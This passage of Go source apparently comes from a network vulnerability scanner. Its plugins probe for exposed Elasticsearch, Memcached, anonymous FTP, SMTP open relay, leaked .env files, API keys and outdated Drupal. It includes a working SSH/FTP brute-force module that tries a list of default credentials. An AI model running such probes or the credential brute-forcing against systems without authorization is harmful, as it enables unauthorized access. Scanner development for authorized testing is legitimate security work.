		Description: "Port 27017 is open, check auth.",
		Solution:    "Restrict via IP whitelist.",
		Reference:   "",
	}
}

// 59. ELASTICSEARCH INFO LEAK
type ElasticPlugin struct{}

func (p *ElasticPlugin) Name() string { return "Elasticsearch Disclosure" }
func (p *ElasticPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 9200 {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/_cat/indices?v"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "health") && strings.Contains(string(buf), "index") {
			return &Vulnerability{
				Target: target, Name: "Elasticsearch Data Leak", Severity: "HIGH", CVSS: 7.5,
				Description: "Index list visible without auth.",
				Solution:    "Enable X-Pack Security.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 60. MEMCACHED STATS UDP/TCP
type MemcachedPlugin struct{}

func (p *MemcachedPlugin) Name() string { return "Memcached Stats" }
func (p *MemcachedPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 11211 {
		return nil
	}
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 2*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()
	conn.Write([]byte("stats\r\n"))
	buf := make([]byte, 2048)
	n, _ := conn.Read(buf)
	if strings.Contains(string(buf[:n]), "STAT pid") {
		return &Vulnerability{
			Target: target, Name: "Memcached Info Disclosure", Severity: "MEDIUM", CVSS: 5.0,
			Description: "Stats command enabled, can be used for DDoS.",
			Solution:    "Disable UDP, listen only on localhost.",
			Reference:   "",
		}
	}
	return nil
}

// 61. ANONYMOUS FTP
type FTPAnonPlugin struct{}

func (p *FTPAnonPlugin) Name() string { return "Anonymous FTP" }
func (p *FTPAnonPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 21 {
		return nil
	}
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 3*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// Read Banner
	buf := make([]byte, 1024)
	conn.Read(buf)

	// Send USER anonymous
	conn.Write([]byte("USER anonymous\r\n"))
	conn.Read(buf)
	conn.Write([]byte("PASS anonymous@dorm.com\r\n"))
	n, _ := conn.Read(buf)

	if strings.Contains(string(buf[:n]), "230") { // 230 Login successful
		return &Vulnerability{
			Target: target, Name: "FTP Anonymous Login", Severity: "HIGH", CVSS: 7.5,
			Description: "FTP login allowed without password.",
			Solution:    "Disable anonymous access.",
			Reference:   "",
		}
	}
	return nil
}

// 62. SMTP OPEN RELAY
type SMTPRelayPlugin struct{}

func (p *SMTPRelayPlugin) Name() string { return "SMTP Open Relay" }
func (p *SMTPRelayPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 25 && target.Port != 587 {
		return nil
	}
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 3*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// Basic handshake
	buf := make([]byte, 1024)
	conn.Read(buf)
	conn.Write([]byte("HELO dorm.com\r\n"))
	conn.Read(buf)
	conn.Write([]byte("MAIL FROM:<test@dorm.com>\r\n"))
	conn.Read(buf)
	// Can we send mail out?
	conn.Write([]byte("RCPT TO:<victim@evil.com>\r\n"))
	n, _ := conn.Read(buf)

	if strings.Contains(string(buf[:n]), "250") { // 250 OK means relay open
		return &Vulnerability{
			Target: target, Name: "SMTP Open Relay", Severity: "CRITICAL", CVSS: 9.0,
			Description: "Server can be used to send spam.",
			Solution:    "Configure relay restrictions.",
			Reference:   "",
		}
	}
	return nil
}

// 63. API KEY LEAK (JS SCAN)
type APIKeyPlugin struct{}

func (p *APIKeyPlugin) Name() string { return "API Key in JS Files" }
func (p *APIKeyPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Get main page
	resp, err := getClient().Get(getURL(target, "/"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	bodyBytes, _ := io.ReadAll(resp.Body)
	body := string(bodyBytes)

	// Regex for AWS or Google Key (Simplified)
	if strings.Contains(body, "AKIA") && len(body) > 20 { // AWS Key ID prefix
		return &Vulnerability{
			Target: target, Name: "AWS API Key Leak", Severity: "CRITICAL", CVSS: 9.5,
			Description: "AWS key starting with 'AKIA' found in source code.",
			Solution:    "Rotate and delete the key.",
			Reference:   "",
		}
	}
	if strings.Contains(body, "AIza") { // Google API Key prefix
		return &Vulnerability{
			Target: target, Name: "Google API Key Leak", Severity: "MEDIUM", CVSS: 5.0,
			Description: "Google API key found in source code.",
			Solution:    "Restrict key usage.",
			Reference:   "",
		}
	}
	return nil
}

// 64. SUBDOMAIN TAKEOVER (CNAME)
type TakeoverPlugin struct{}

func (p *TakeoverPlugin) Name() string { return "Subdomain Takeover Risk" }
func (p *TakeoverPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Look for specific cloud provider errors in 404 pages
	resp, err := getClient().Get(getURL(target, "/"))
	if err == nil {
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		body := string(bodyBytes)

		signatures := []string{
			"There is no app configured at that hostname", // Heroku
			"NoSuchBucket", // AWS S3
			"The specified bucket does not exist",
			"Fastly error: unknown domain", // Fastly
		}

		for _, sig := range signatures {
			if strings.Contains(body, sig) {
				return &Vulnerability{
					Target: target, Name: "Subdomain Takeover", Severity: "HIGH", CVSS: 8.0,
					Description: "Domain points to an unclaimed cloud resource.",
					Solution:    "Delete DNS record or claim resource.",
					Reference:   "",
				}
			}
		}
	}
	return nil
}

// 65. ASP.NET VIEWSTATE (Unencrypted)
type ViewStatePlugin struct{}

func (p *ViewStatePlugin) Name() string { return "ASP.NET ViewState Encryption" }
func (p *ViewStatePlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/"))
	if err == nil {
		defer resp.Body.Close()
		bodyBytes, _ := io.ReadAll(resp.Body)
		body := string(bodyBytes)
		// Check for ViewState
		if strings.Contains(body, "__VIEWSTATE") {
			// If MAC (Message Authentication Code) is missing, it's dangerous
			if !strings.Contains(body, "mac=") && !strings.Contains(body, "__VIEWSTATEGENERATOR") {
				return &Vulnerability{
					Target: target, Name: "Unencrypted ViewState", Severity: "MEDIUM", CVSS: 5.5,
					Description: "ASP.NET ViewState is not encrypted or signed.",
					Solution:    "Add validation='SHA1' to machineKey config.",
					Reference:   "",
				}
			}
		}
	}
	return nil
}

// 66. LARAVEL .ENV
type LaravelEnvPlugin struct{}

func (p *LaravelEnvPlugin) Name() string { return "Laravel .env Disclosure" }
func (p *LaravelEnvPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/.env"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "APP_KEY=") {
			return &Vulnerability{
				Target: target, Name: "Laravel .env Disclosure", Severity: "CRITICAL", CVSS: 10.0,
				Description: "Application keys and DB passwords exposed.",
				Solution:    "Block access to .env file.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 67. COLDFUSION DEBUGGING
type ColdFusionPlugin struct{}

func (p *ColdFusionPlugin) Name() string { return "ColdFusion Debugging" }
func (p *ColdFusionPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/CFIDE/debug/cf_debug.cfm"))
	if err == nil && resp.StatusCode == 200 {
		return &Vulnerability{
			Target: target, Name: "ColdFusion Debug Mode", Severity: "HIGH", CVSS: 7.5,
			Description: "ColdFusion debug interface exposed.",
			Solution:    "Restrict CFIDE folder.",
			Reference:   "",
		}
	}
	return nil
}

// 68. DRUPALGEDDON2 (CVE-2018-7600)
type DrupalPlugin struct{}

func (p *DrupalPlugin) Name() string { return "Drupalgeddon2 RCE" }
func (p *DrupalPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Only check version/path, not sending payload
	resp, err := getClient().Get(getURL(target, "/CHANGELOG.txt"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "Drupal 7.") {
			return &Vulnerability{
				Target: target, Name: "Outdated Drupal Version", Severity: "MEDIUM", CVSS: 6.0,
				Description: "Old Drupal version detected, possible Drupalgeddon risk.",
				Solution:    "Update Drupal.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 69. EXPOSED GITLAB USER ENUM
type GitLabPlugin struct{}

func (p *GitLabPlugin) Name() string { return "GitLab User Enum" }
func (p *GitLabPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/api/v4/users?per_page=1"))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "\"username\":") {
			return &Vulnerability{
				Target: target, Name: "GitLab API Exposed", Severity: "MEDIUM", CVSS: 5.3,
				Description: "GitLab user list accessible via public API.",
				Solution:    "Restrict public API access.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 70. NGINX ALIAS TRAVERSAL (Off-by-slash)
type NginxTraversalPlugin struct{}

func (p *NginxTraversalPlugin) Name() string { return "Nginx Alias Traversal" }
func (p *NginxTraversalPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Tests for config errors like /static/../
	resp, err := getClient().Get(getURL(target, "/static../"))
	if err == nil {
		defer resp.Body.Close()
		// If directory listing or path error returns
		if resp.StatusCode == 200 || resp.StatusCode == 403 { // Sometimes 403 proves existence
			// Simple check, might be False Positive but worth investigating
			return nil
		}
	}
	return nil
}

// 71. DOM XSS & SPA SCANNER (HEADLESS CHROME)
type DOMScannerPlugin struct{}

func (p *DOMScannerPlugin) Name() string { return "DOM XSS & SPA Scanner (Chrome)" }
func (p *DOMScannerPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// Context for starting Chrome
	// Runs in headless mode (no window)
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
	)

	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()

	// 15 Second timeout (Browsers are slow, let's not wait forever)
	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()
	ctx, cancel = context.WithTimeout(ctx, 15*time.Second)
	defer cancel()

	// DOM XSS Test: Trying payload via URL Fragment (#)
	// Modern SPA sites (React/Vue) route based on this data.
	payload := "dorm_xss_check"
	targetURL := getURL(target, "/#"+payload)

	var res string
	// Command Chrome: Go, Wait, Dump HTML
	err := chromedp.Run(ctx,
		chromedp.Navigate(targetURL),
		// Wait until body loads (SPA render time)
		chromedp.WaitVisible("body", chromedp.ByQuery),
		// Get rendered HTML (OuterHTML)
		chromedp.OuterHTML("html", &res),
	)

	if err != nil {
		// Exit silently if browser fails or times out
		return nil
	}

	if strings.Contains(res, payload) {
		return &Vulnerability{
			Target:      target,
			Name:        "DOM Based XSS / Reflected",
			Severity:    "HIGH",
			CVSS:        7.2,
			Description: "Payload detected in DOM after JavaScript rendering (SPA Vulnerability).",
			Solution:    "Sanitize user inputs in JavaScript.",
			Reference:   "OWASP DOM XSS",
		}
	}
	return nil
}

// 73. (SSH & FTP BRUTE FORCE)
type BruteForcePlugin struct{}

func (p *BruteForcePlugin) Name() string { return "Mini-Hydra (SSH/FTP Brute Force)" }

func (p *BruteForcePlugin) Run(target ScanTarget) *Vulnerability {
	// Only works on SSH (22) and FTP (21)
	if target.Port != 22 && target.Port != 21 {
		return nil
	}

	creds := []struct{ User, Pass string }{
		{"root", "root"},
		{"admin", "admin"},
		{"root", "toor"},
		{"user", "user"},
		{"admin", "password"},
		{"root", "123456"},
		{"administrator", "password"},
		{"ubuntu", "ubuntu"}, // For AWS machines
		{"pi", "raspberry"},  // For Raspberry Pi
		{"vagrant", "vagrant"},
	}

	foundCreds := ""

	// --- FTP ATTACK (PORT 21) ---
	if target.Port == 21 {
		for _, c := range creds {
			conn, err := ftp.Dial(fmt.Sprintf("%s:%d", target.IP, target.Port), ftp.DialWithTimeout(2*time.Second))
			if err == nil {
				err = conn.Login(c.User, c.Pass)
				if err == nil {

					foundCreds = fmt.Sprintf("FTP Cracked! User: '%s' Pass: '%s'", c.User, c.Pass)
					conn.Logout()
					conn.Quit()
					break // Found it, no need to force more
				}
				conn.Quit()
			}
			// Tiny sleep to avoid choking the server
			// time.Sleep(100 * time.Millisecond)
		}
	}

	// --- SSH ATTACK (PORT 22) ---
	if target.Port == 22 {
		for _, c := range creds {
			config := &ssh.ClientConfig{
				User: c.User,
				Auth: []ssh.AuthMethod{
					ssh.Password(c.Pass),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Skip host key check
				Timeout:         2 * time.Second,
			}

			// Try connection
			client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), config)
			if err == nil {

				foundCreds = fmt.Sprintf("SSH Cracked! User: '%s' Pass: '%s'", c.User, c.Pass)
				client.Close()
				break
			}
		}
	}

	// Report if cracked
	if foundCreds != "" {
		return &Vulnerability{
			Target:      target,
			Name:        "Critical Access: Default Password (Brute-Force)",
			Severity:    "CRITICAL",
			CVSS:        10.0,
			Description: "Logged in with default/weak password: " + foundCreds,
			Solution:    "Change all default passwords immediately and use SSH key-based auth.",
			Reference:   "CWE-521: Weak Password Requirements",
		}
	}

	return nil
}

// ==========================================
// INVENTORY LIST FOR UI
// ==========================================
func GetPluginInventory() []string {
	return []string{
		"Open Port Detection", "Service Banner Info", "Security Headers Analysis", "SSL Certificate Check", "Basic File Scan",
		"CORS Misconfiguration", "WordPress User Disclosure", "PHP Info Check", "WAF Detection", "Open Redirect",
		"SQL Injection Scanner", "XSS (Cross-Site Scripting)", "LFI (Local File Inclusion)", "Spring Boot Actuator",
		"Git Configuration", "Backup File", "Apache Server Status", "DS_Store Disclosure", "HTTP TRACE Method",
		"ENV File Disclosure", "CMS Detection", "Admin Panel Finder", "Shellshock Vulnerability", "Laravel Debug Mode",
		"Docker API Exposure", "Cookie Security", "Security.txt File", "WebDAV Methods", "Email Disclosure", "S3 Bucket Detection",
		"Clickjacking Check", "GraphQL Schema Disclosure", "Swagger UI Detection", "Host Header Injection",
		"System Metrics Exposure", "SSTI Test", "HSTS (HTTPS Enforcement)", "Tomcat Manager Panel",
		"Editor/Config File Disclosure", "Open Directory Listing", "Blind Command Injection (Time)",
		"XXE Injection", "Admin Panel Bypass (IP Spoof)", "CRLF Injection", "Dangerous HTTP Methods",
		"Java Deserialization Risk", "Node.js Prototype Pollution", "Directory Traversal", "Config.json Disclosure",
		"IDOR / Unauthorized Access Test", "Log4Shell (CVE-2021-44228)", "Kubernetes Kubelet API", "Docker Registry Exposure", "Spring Cloud Gateway RCE",
		"F5 BIG-IP TMUI RCE", "Jenkins Script Console", "Redis Unauthorized Access", "MongoDB Unauthorized Access", "Elasticsearch Disclosure",
		"Memcached Stats", "Anonymous FTP", "SMTP Open Relay", "API Key in JS Files", "Subdomain Takeover Risk",
		"ASP.NET ViewState Encryption", "Laravel .env Disclosure", "ColdFusion Debugging", "Drupalgeddon2 RCE", "GitLab User Enum", "Nginx Alias Traversal",
	}
}




